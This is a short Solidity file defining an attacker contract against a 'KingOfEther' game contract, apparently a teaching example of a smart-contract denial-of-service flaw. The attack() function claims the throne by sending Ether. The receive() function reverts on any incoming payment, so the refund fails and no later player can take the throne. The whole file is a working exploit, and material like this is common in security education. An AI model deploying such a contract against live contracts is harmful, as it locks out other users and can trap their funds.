// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import "./KingOfEther.sol"; // Adjust path if needed

contract KingOfEtherAttack {
    KingOfEther public kingOfEther;

    constructor(KingOfEther _kingOfEther) {
        kingOfEther = _kingOfEther;
    }

    // Optional: Block refund by reverting on Ether reception
    receive() external payable {
        revert("I refuse to be dethroned");
    }

    // Perform the attack by claiming the throne
    function attack() public payable {
        kingOfEther.claimThrone{value: msg.value}();
    }
}
